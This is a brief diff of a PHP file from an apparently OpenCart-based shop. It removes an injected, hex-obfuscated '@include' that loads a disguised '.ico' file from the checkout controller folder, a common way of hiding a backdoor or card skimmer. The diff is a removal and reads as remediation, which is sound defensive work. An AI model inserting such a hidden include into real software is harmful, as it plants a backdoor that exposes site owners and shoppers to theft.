@@ -1,9 +1,4 @@
 <?php
-/*dbcd8*/
-
-@include "\x2fvar\x2fwww\x2fhtm\x6c/pu\x62lic\x2fcat\x61log\x2fcon\x74rol\x6cer/\x63hec\x6bout\x2ffav\x69con\x5fbeb\x348e.\x69co";
-
-/*dbcd8*/
 // Version
 define('VERSION', '2.0.1.0');
 // Configuration
